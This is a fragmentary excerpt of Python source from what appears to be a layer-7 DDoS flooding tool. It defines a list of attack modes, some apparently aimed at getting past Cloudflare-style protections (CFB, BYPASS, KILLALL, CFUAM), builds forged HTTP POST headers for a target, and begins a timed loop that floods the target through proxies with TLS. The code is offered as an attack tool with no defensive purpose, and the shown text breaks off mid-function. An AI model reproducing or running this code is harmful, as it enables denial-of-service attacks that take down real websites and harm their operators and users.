...
from socket import IPPROTO_RAW, IPPROTO_TCP
...
l7 = ["CFB","GET", "POST","POSTV2","SPAMMER","GETV2","HTTPFAST","HTTPFASTV2","MIX","MIXV2","BYPASS","BYPASSV2","AMAZONBYPASS","AMAZONBYPASSV2","CFBV2","KILLALL","HTTP_BETA","CFUAM","CFUAMV2"]
...
def Headers(method):
    ...
    elif method == "post" or method == "spammer" or method == "killall" or method == "cfuamv2":
        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
        refer = "Referer: http://" + target + path + "\r\n"
        user_agent = "User-Agent: " + UserAgent + "\r\n"
...
def killall(event, socks_type):
    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s.setsockopt(IPPROTO_TCP,socket.TCP_FASTOPEN, 1)
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
